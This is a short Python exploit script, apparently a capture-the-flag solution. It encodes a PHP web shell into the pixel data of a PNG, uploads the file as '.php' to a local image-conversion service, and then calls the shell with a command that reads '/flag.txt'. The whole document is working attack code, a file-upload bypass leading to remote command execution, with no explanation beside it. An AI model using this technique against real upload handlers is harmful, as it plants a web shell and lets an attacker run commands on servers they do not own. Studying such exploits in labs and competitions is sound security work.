from PIL import Image
import requests
import io

TARGET_URI = 'http://localhost:8080/'

im = Image.new("RGBA", (64, 64), "white")
pix = im.load()

payload = b"<?php    echo(exec($_GET[\"c\"])) ; ?>"

for i, vals in enumerate(zip(*[iter(payload)]*4)):
	if vals[3] % 2 == 1:
		print(f"invalid alpha character '{payload.decode()[i*4+3]}' ({vals[3]}) (needs to be divisible by 2)")
	pix[(i%64,i//64)] = (vals[2],vals[1],vals[0],vals[3])

out = io.BytesIO()
im.save(out, "PNG")
out.seek(0, 0)

files = {
    'file': ('.php', out, 'image/png'),
    'submit': (None, 'Convert'),
}
requests.post(TARGET_URI, files=files)
r = requests.get(TARGET_URI + "uploads/.php?c=cat+/flag.txt")

print('Flag: x3c{' + r.text.split("x3c{")[1].split("}")[0] + '}')

